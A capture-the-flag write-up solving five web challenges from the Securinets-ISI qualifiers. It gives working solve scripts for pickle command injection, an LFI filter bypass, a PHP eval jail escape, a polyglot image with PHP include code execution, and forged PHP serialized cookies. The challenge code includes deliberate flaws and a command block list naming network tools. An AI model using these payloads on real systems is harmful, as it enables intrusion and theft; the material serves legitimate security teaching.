# Writeups Web Quals/25 - Securinets-ISI
**You can find all tasks files up above in the same repo**

## I. Ricky
Acceding the first page we can see that we can upload any file to the server but we get redirected to a Rick and Morty video.
This hints to `pickle` library or to upload a `.pkl` file
we can try to upload a malicious file with this content:
```python
malicious_file= "exploit.pkl"
pickle.dump("cat flag.txt", open(malicious_file, "wb"))
```
but since there's no output returned we try more things in other pages, but we keep this in mind
Passing to `/gallery`, we find a hint **You can keep on watching our gallery or you can check other files in this gallery, by a simple `?`**

so we try `curl http://98.66.180.82:1024/gallery\?file=/app/app.py`
to get the source code of app.py
```python
from flask import Flask, request, render_template, redirect
import pickle
import os

app = Flask(__name__)

@app.route('/')

def home():
    return render_template("index.html")

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return render_template("result.html", message="No file uploaded, ye scallywag!")
    file = request.files['file']
    if file.filename == '':
        return render_template("result.html", message="No file selected, ye landlubber!")
    if not file.filename.lower().endswith('.pkl'):
        return redirect("https://www.youtube.com/watch?v=tZp8sY06Qoc")
    try:
        data = pickle.loads(file.read())
        print(f"Received command: {data}")
        if not isinstance(data, str):
            return render_template("result.html", message="Invalid input format, matey!")
        command = data.strip()
        banned_tokens = ["rm", "mv", "cat", "chmod", "chown", "wget", "curl", "python", "bash", "sh","nc", "netcat", ";", "|", "&&", "`", "$(", "sudo", "dd", "<", "||", "exec","open", "system", "ls", "find", "tar", "zip", "unzip", "rmdir", "unlink","unlinkat", "rename", "renameat", "remove", "removeat", ".."]
        for token in banned_tokens:
            if token in command:
                return render_template("result.html", message=f"Invalid command! Banned token found: {token}")
        if command.startswith("cp "):
            parts = command.split()
            if len(parts) != 3:
                return render_template("result.html", message="Invalid cp command format. Must be: cp <source> <destination>")
            _, source, destination = parts
            if not destination.startswith("/tmp/"):
                return render_template("result.html", message="You can only copy files into /tmp!")   
            if not os.path.abspath(source).startswith(os.getcwd()):
                return render_template("result.html", message="Invalid source! File must be inside the challenge directory.")          
        os.system(command)
        return render_template("result.html", message="Bingo! The bomb has been sent to Davy Jones' locker!")
    except Exception as e:
        return render_template("result.html", message=f"Shiver me timbers! There be an error: {e}")


@app.route('/gallery', methods=['GET'])
def gallery():
    filename = request.args.get('file')
    if filename and ('/app/flag.txt' in filename or filename is '/app/app.py'):
        return render_template("result.html", message="You can't view that file, ye scurvy dog!")

    if filename:
        try:
            with open(filename, 'r') as f:
                content = f.read()
            return render_template("result.html", message=content)
        except Exception as e:
            return render_template("result.html", message=f"Error reading file: {e}")
    return render_template("gallery.html")

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
```

After reading the source code we can find that
- the command we supply in is being executed but there's a blacklist of the multiple commands.
- In `/gallery` route there's a LFI and a blacklist for reading the flag directly, or that was the intended path in the challenge to read only ``app.py`` with 
``curl http://98.66.180.82:1024/gallery?file=../app/app.py``
- until my teammate [EL_GASTRA](https://github.com/ghassen202)  noticed that we can simply bypass the flag check by using
``curl http://98.66.180.82:1024/gallery?file=/app//flag.txt``

![](Images/Pasted%20image%2020250223173359.png)

Going back to our direct solve method, we have an idea what the server is doing so we can craft the following solver.py

```python
import requests
import pickle
import re

# Define the upload URL
up_url = "http://98.66.180.82:1024/upload"
# Define the gallery URL 
gal_url="http://98.66.180.82:1024/gallery?file=/tmp/flag.txt"
# Specify the local file name to store the exploit payload
file_path= "exploit.pkl"
# Create a malicious pickle payload that copies the flag to a readable location
pickle.dump("cp flag.txt /tmp/", open(file_path, "wb"))
# Open the exploit file in binary mode and send it via POST request to upload
with open(file_path, "rb") as f:
    files = {"file": f}
    a = requests.post(up_url, files=files)
# Make a GET request to access the flag after execution
resp = requests.get(gal_url)
# Search for the flag pattern using regex
search = re.search(r"Securinets{.*}", resp.text)
#Print the extracted flag
print(search.group(0))
```
And we can get the flag.txt which is
**Securinets{G00d_Ch4in_m00rtYYY!}**

> Poc
![Pasted image 20250223221256](https://github.com/user-attachments/assets/eb4e29e7-6a1c-41ca-9465-ee816b5337f8)

## II. PHP Jail
The next challenge is a php jail;
```php
<?php
error_reporting(0);

$output = "";
$message = "";
$blacklist = ['system', 'exec', 'shell_exec', 'passthru', 'flag'];

if (isset($_GET['parse'])) {
    $a = $_GET['parse'] ?? '';
    foreach ($blacklist as $badword) {
        if (stripos($a, $badword) !== false) {
            $message = "That's not allowed. I thought you already knew that.";
            goto end;
        }
    }
    function _X($b) {
        $c = str_replace(["<?", "?>"], "", $b);
        $c = preg_replace('/\b(system|exec|shell_exec|passthru|flag)\b/i', "", $c);
        $c = preg_replace('/\btrue\b/i', "", $c);
        return $c;
    }
    $d = _X($a);
    if (preg_match('/\{if:\s*(.*?)\)\s*(.*?)\s*;\/\/\}(.*?)\{end if\}/is', $d, $e)) {
        $f = $e[1];
        $g = $e[2];
        $h = $e[3];
        $i = false;
        try {
            @eval('$i = ('.$f.');');
        } catch (Throwable $e) {
            $message = "WTF you doing?";
            goto end;

        }
        if ($i) {
            try {
                @eval($g.';');
            } catch (Throwable $e) {
                $message = "WTF you doing?";
                goto end;
            }
        }
        $output = htmlspecialchars($h);
    } else {
        $message = "WTF you doing?";
    }
}
end:
?>
```

After deobfuscating the source code of the app we can see that we need to validate this condition:
``{if: condition) action; //}payload{end if}`` 

which regex is 

`/\{if:\s*(.*?)\)\s*(.*?)\s*;\/\/\}(.*?)\{end if\}/is`

lets test a simple phpinfo() payload with **`{if: 1); phpinfo();//}{end if}`**
```bash
curl http://20.199.80.129:2022/?parse=%7Bif%3A+1%29%3B+phpinfo%28%29%3B%2F%2F%7D%7Bend+if%7D
````
and we can get the **phpinfo()** page.

Now lets craft a payload to get a Remote Command Execution:
```r
parse={if:3<4)('s'.'ystem')('cat *.txt');//}ndl{end if}
```

Final request:
>Poc

![Pasted image 20250223215518](https://github.com/user-attachments/assets/bf14c604-520f-4fe2-beac-abc0163b016d)
## III. Chained Together
This challenge comes with a source code we first check `contact.php`
```php
$file = $_FILES['file'];
$filename = basename($file['name']);
$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($file['type'], $allowed_types) || !in_array($ext, ['jpg', 'png', 'gif'])) {
                die("Invalid scroll type or markin', arr!");
            }
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime_type = finfo_file($finfo, $file['tmp_name']);
if (!in_array($mime_type, $allowed_types)) {
	die("Scroll contents be fishy, arr!");
            }
$upload_dir = 'uploads/';
$target_path = $upload_dir . $filename;
if (move_uploaded_file($file['tmp_name'], $target_path)) {

    $_SESSION['upload_complete'] = true;
    $_SESSION['uploaded_file'] = $filename;
    echo "Message stowed successfully: <a ref='/uploads/$filename'>$filename</a>";
        } 
else {
	echo "Message lost at sea, arr!";
		}

        } 
else {
	echo "<form method='POST' enctype='multipart/form-data'>";
	echo "<input type='file' name='file' required><br>";
	echo "<input type='submit' value='Toss Bottle'>";
	echo "</form>";
        }
```

We can find that there's a file upload functionality that checks the MIME type and the extension of the uploaded file, which is bypassable xD. And we can inject a php code in an image.

Next is `/internal/api.php` :
```php
<?php
session_start();
header("Content-Type: text/plain");
if (!isset($_SERVER['HTTP_X_API_KEY']) || $_SERVER['HTTP_X_API_KEY'] !== 'PIRATE_KEY_789') {
    echo "Wrong key, ye landlubber!";
    exit;
}
if (!isset($_SESSION['upload_complete']) || $_SESSION['upload_complete'] !== true) {
    echo "Stow a message in a bottle first, arr!";
    exit;
}

if (isset($_GET['action']) && $_GET['action'] === 'include' && isset($_GET['file'])) {
    $file = $_GET['file'];
    if (strpos($file, '/uploads/') !== 0 || strpos($file, '../') !== false) {
        echo "Stay in the hold, arr! Only uploads be allowed!";
        exit;
    }

    $full_path = '/var/www/html' . $file;
    $real_path = realpath($full_path);
    if (!$real_path || strpos($real_path, '/var/www/html/uploads/') !== 0) {
        echo "Invalid scroll path, arr!";
        exit;
    }

    if (file_exists($real_path)) {
        include($real_path);
    } 
    else {
        echo "Scroll not found, arr!";
    }
}
?>
```

Now Lets revisit what we have to craft our final script:
- We have a file upload vulnerability, we just need to bypass the basic file type checks
- This PHP script above allows file inclusion from the `/uploads/` directory if the correct API key and session variable are set. 
- We can execute any PHP file we upload since `include($real_path);` executes the uploaded file's content. 
- We Have the `HTTP_X_API_KEY` from the source code of  `/internal/api.php`.
Putting all these together, we can have this nice shell script to get the flag:

```bash
#!/bin/bash
# Create a fake JPEG file header (bypasses )
printf "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01" > evil.jpg  
# Append a PHP payload to read and print the flag since we know its it /var
printf '<?php ob_clean(); $flag = file_get_contents("/var/flag.txt"); echo $flag; ?>' >> evil.jpg  
# Upload the malicious "image" file using a POST request (stores session cookies)
curl -X POST -c cookies.txt -b cookies.txt -F "file=@evil.jpg" "http://20.199.80.129:2030/contact.php"  
# Trigger the file inclusion vulnerability to execute the uploaded PHP code
curl -b cookies.txt -H "X-API-Key: PIRATE_KEY_789" "http://20.199.80.129:2030/internal/api.php?action=include&file=/uploads/evil.jpg" --output flag.txt  
# Display the extracted flag
cat flag.txt  
```

>Poc
![Pasted image 20250223183015](https://github.com/user-attachments/assets/3ea7e73a-5a41-468c-855c-f03cf1997b12)

## IV. SerialKiller 🔪
For this task we got `secrets.php` where the app uses PHP’s `unserialize()` function on user-controlled cookie data
```php
// secrets.php
<?php
    class Secret {
        public $username;
        public $token;
        public function __construct($username, $token) {
            $this->username = $username;
            $this->token = $token;
        }
    }
    function setSecretCookie() {
        $test = new Secret('test', 'weaktoken');
        setcookie('secret', base64_encode(serialize($test)), time() + 3600, "/");
    }

    if (isset($_POST['set']) && $_POST['set'] == 'Reset') {
        setSecretCookie();
    }
    if (isset($_COOKIE['secret'])) {
        $user = unserialize(base64_decode($_COOKIE['secret']));
        if ($user->username==='admin' && $user->token==='ABCDDAZAZUIDUBIUAFZ123456789') {
            echo '<div class="terminal">Securinets{fake_flag}</div>';
        } else {
            echo '<div class="terminal">Sup low Privileged Punk</div>';
        }
    }
?>
```

Since we got everything we need of admin we can craft our own payload with 
```php
$ php -a
Interactive shell 
php > class Secret { 
php { public $username; 
php { public $token; 
php { public function __construct($username, $token) { 
php { $this->username = $username; 
php { $this->token = $token; 
php { } 
php { } 
php > } 
php > $obj = new Secret("admin", "ABCDDAZAZUIDUBIUAFZ123456789"); 
php > $ser = serialize($obj); 
O:6:"Secret":2{s:8:"username";s:5:"admin";s:5:"token";s:28:"ABCDDAZAZUIDUBIUAFZ123456789";}
php > echo base64_encode($ser);
Tzo2OiJTZWNyZXQiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6NToidG9rZW4iO3M6Mjg6IkFCQ0REQVpBWlVJRFVCSVVBRloxMjM0NTY3ODkiO30=
php >
```

And finally we send our payload to get admin account:
>Poc

![Pasted image 20250223223503](https://github.com/user-attachments/assets/fc768252-bb93-41e3-aa7b-5e2bf04320d1)

## V. SerialKiller Pro Max 🔪🩸
For this task we got the same logic of the app, but this time without the secret 
```php
// more_secrets.php
<?php
    class Secret {
        public $username;
        public $token;
        public function __construct($username, $token) {
            $this->username = $username;
            $this->token = $token;
        }
    }
    function setSecretCookie() {
        $someguy = new Secret('test', 'weaktoken');
        setcookie('secret', base64_encode(serialize($someguy)), time() + 3600, "/");
    }
    if (isset($_POST['set']) && $_POST['set'] == 'Reset') {
        setSecretCookie();
    }
    if (isset($_COOKIE['secret'])) {
        $user = unserialize(base64_decode($_COOKIE['secret']));
        if ($user->username==='admin' && $user->token=='REDACTED') {
            echo '<div class="terminal">Securinets{fake_flag}</div>';
        } else {
            echo '<div class="terminal">You again ?? U still a punk !</div>';
        }
    }
?>
```

Seeing this line is the key to getting an admin account
```php
if ($user->username==='admin' && $user->token=='REDACTED'):
```
First we got 2 types of comparisons in php:
- **Loose** comparison: using `== or !=` : both variables have "the same value".
- **Strict** comparison: using `=== or !==` : both variables have "the same type and the same value".

You can find more here:
![Pasted image 20250223221421](https://github.com/user-attachments/assets/b86f2412-2130-4cd7-87bf-3c593a412697)

From this table we know that with **=*=*** we can get a TRUE statement when sending a Boolean value
```php
$ php -a
Interactive shell 
php > var_dump(true == 'REDACTED_TOKEN');
bool(true)
php >
```

With that, we can serialize our object and be ready to send it to the server
```php
$ php -a
Interactive shell 
php > class Secret { 
php { public $username; 
php { public $token; 
php { public function __construct($username, $token) { 
php { $this->username = $username; 
php { $this->token = $token; 
php { } 
php { } 
php > } 
php > $obj = new Secret("admin", true); 
php > $ser = serialize($obj); 
O:6:"Secret":2:{s:8:"username";s:5:"admin";s:5:"token";b:1;} php >
php > echo base64_encode($ser);
Tzo2OiJTZWNyZXQiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6NToidG9rZW4iO2I6MTt9
php >
```

Finally we send the final request to the server with our serialized object:
> Poc

![](https://github.com/user-attachments/assets/0e3c76ee-05a6-41d5-b465-0cc1f262bca7)
